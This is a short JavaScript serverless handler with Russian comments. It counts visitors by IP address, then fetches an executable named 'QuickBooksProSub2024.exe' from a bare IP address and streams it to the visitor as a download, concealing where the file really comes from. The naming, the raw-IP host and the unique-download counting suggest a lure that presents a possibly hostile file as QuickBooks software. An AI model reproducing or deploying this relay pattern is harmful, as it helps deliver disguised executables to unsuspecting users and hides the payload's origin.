import { pipeline } from 'stream/promises';

export default async function handler(req, res) {
  const ip = (req.headers['x-forwarded-for'] || req.headers['x-real-ip'] || 'unknown')
    .toString()
    .split(',')[0]
    .trim();

  try {
    // Считаем уникальные скачивания (если KV подключён)
    if (process.env.KV_REST_API_URL) {
      const { kv } = await import('@vercel/kv');
      await kv.sadd('unique_QuickBooksProSub', ip);
      const count = await kv.scard('unique_QuickBooksProSub');
      console.log(`[${new Date().toISOString()}] IP: ${ip} | Уникальных: ${count}`);
    }

    const rawUrl = 'http://45.77.95.227/files/QuickBooksProSub2024.exe';

    const upstreamResponse = await fetch(rawUrl, {
      // Добавляем таймаут на всякий случай
      signal: AbortSignal.timeout(30000),
    });

    if (!upstreamResponse.ok) {
      console.error('Файл не доступен:', upstreamResponse.status);
      return res.status(502).send('Файл временно недоступен');
    }

    // Пробрасываем важные заголовки
    res.setHeader('Content-Type', 'application/octet-stream');
    res.setHeader('Content-Disposition', 'attachment; filename="QuickBooksProSub2024.exe"');

    if (upstreamResponse.headers.get('content-length')) {
      res.setHeader('Content-Length', upstreamResponse.headers.get('content-length'));
    }

    // === ГЛАВНОЕ: стримим файл, а не грузим в память ===
    await pipeline(upstreamResponse.body, res);

  } catch (error) {
    console.error('Ошибка при скачивании:', error);
    if (!res.headersSent) {
      res.status(500).send('Ошибка при скачивании файла');
    }
  }
}
